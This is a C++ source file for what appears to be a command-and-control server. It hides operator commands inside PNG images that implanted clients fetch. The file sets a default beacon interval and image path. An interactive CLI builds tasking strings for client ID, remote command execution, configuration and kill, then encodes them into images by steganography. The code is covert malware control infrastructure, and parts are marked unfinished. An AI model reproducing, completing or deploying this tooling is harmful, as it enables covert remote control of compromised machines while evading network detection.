#ifndef SERVER_H
#include "server.h"
#include "stegImage.h"
#include <getopt.h>
#include <pthread.h>

#endif

void *cli(void *params);

struct commandS{
    std::string Kill;
    std::string Conf;
    std::string Gath;
    std::string Shell;
    std::string Exec;
    std::string id;
};
enum comType{
    Kill,   
    Conf,
    Gath,
    Shell,
    Exec,
};
//Later use
static struct option gLongOptions[] = {
    {"port", required_argument, NULL, 'p'},
    {"threads", required_argument, NULL, 't'},

};

int main(int argc, char *argv[]){
    int option_char = 0;            //Options (Need to implement later)
    std::string port = "8080";      //Port number to bind to
    int nthreads = 10;              //Worker threads (Will implement later)

    //Create a thread for the CLI
    pthread_t cliThread;
    pthread_create(&cliThread, NULL, cli,NULL);

    //Initial Command
    std::string command = "<COM:ALL:1-beacon-5000:1-path-/images/tree.png>";  //Default command to send client. Client will read this, and connect to us.
    std::string dImage = "images/defaultR.png";                  //Default png file to edit
    std::string wImage = "images/default.png";                 //Default image client will request
    stegImage encodeImage;

    //Encode Initial Command into image
    encodeImage.readPNG(&dImage,command);   
    encodeImage.writePNG(&wImage);

    //Set the socket port/Maxpending connections
    Server socketServer(100,port);
    //Perform (Accept connects, perform GET/POST Requests)
    socketServer.perform();
    
}

//CLI 
void *cli(void *params){
    commandS commS;
    while (true){
        std::string command;
        int delim = 0;
        int prevDelim=0;
        std::getline(std::cin,command);

        delim = command.find(" ");
        if(command.substr(0,delim) == "set"){
            prevDelim=delim + 1;
            delim = command.find(" ",prevDelim);
            if(command.substr(prevDelim, delim - prevDelim) == "ID"){
                prevDelim = delim + 1;
                delim = command.find(" ", prevDelim);
                commS.id = command.substr(prevDelim, command.length());
            }else if(command.substr(prevDelim, delim - prevDelim) == "EXEC"){
                prevDelim = delim + 1;
                delim = command.find(" ", prevDelim);
                commS.Exec = command.substr(prevDelim, command.length());
            }else if(command.substr(prevDelim, delim - prevDelim) == "CONF"){
                prevDelim = delim + 1;
                delim = command.find(" ", prevDelim);
                commS.Conf = command.substr(prevDelim, command.length());
            }else if(command.substr(prevDelim, delim - prevDelim) == "KILL"){
                prevDelim = delim + 1;
                delim = command.find(" ", prevDelim);
                commS.Kill = command.substr(prevDelim, command.length());
            }else{
                std::cout <<"Error, Invalid command\n";
            }
        }else if(command.substr(0,delim) == "run"){
            std::string commandParser = "<COM";
            if(!commS.id.empty()){
                commandParser.append(":");
                commandParser.append(commS.id);
            }else{
                std::cout << "Error: ID Required";
                continue;
            }
            if(!commS.Exec.empty()){
                int curr = 0;
                int prev = 0;
                commandParser.append(":4-");
                commandParser.append(commS.Exec);
            }
            if(!commS.Conf.empty()){
                commandParser.append(":1-");
                commandParser.append(commS.Conf);
            }
            if(!commS.Kill.empty()){
                commandParser.append(":");
                commandParser.append("0-0");
            }
            commandParser.append(">");
            std::string dImage = "images/defaultR.png";                  //Default png file to edit
            std::string wImage = "images/tree.png"; 
            stegImage encodeImage;
            encodeImage.readPNG(&dImage,commandParser);   
            encodeImage.writePNG(&wImage);
        }else if(command.substr(0,delim) == "show"){
            std::cout <<
            "COMMAND            STATUS            STATUS      \n"
            "-------            ------            ------      \n"
            "KILL               NOT REQUIRED        "+ commS.Kill + " \n"
            "CONF               NOT REQUIRED        "+ commS.Conf + " \n"
            "EXEC               NOT REQUIRED        "+ commS.Exec + " \n"
            "ID                 NOT REQUIRED        "+ commS.id +   " \n";

        }else {
            std::cout << "Error: Invalid Command \n"; 
        }

        
    }
}